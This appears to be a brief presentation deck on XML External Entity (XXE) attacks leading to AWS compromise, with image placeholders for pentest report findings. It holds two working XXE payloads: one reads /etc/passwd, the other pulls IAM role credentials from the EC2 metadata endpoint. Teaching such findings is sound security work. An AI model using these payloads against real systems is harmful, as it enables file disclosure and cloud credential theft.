# XXE and AWS Compromise

---

## @fa[book](Background)
![diagram](xxe-aws-compromise/assets/diagram1.png)

---

## @fa[code](XML Entities)
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

---

## @fa[file-signature](Pentest Report)
![diagram](xxe-aws-compromise/assets/vuln1.png)

---

## @fab[aws](AWS Metadata)
```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-iam-role" >]><foo>&xxe;</foo>
```

---

## @fa[file-signature](Pentest Report)
![diagram](xxe-aws-compromise/assets/vuln2.png)
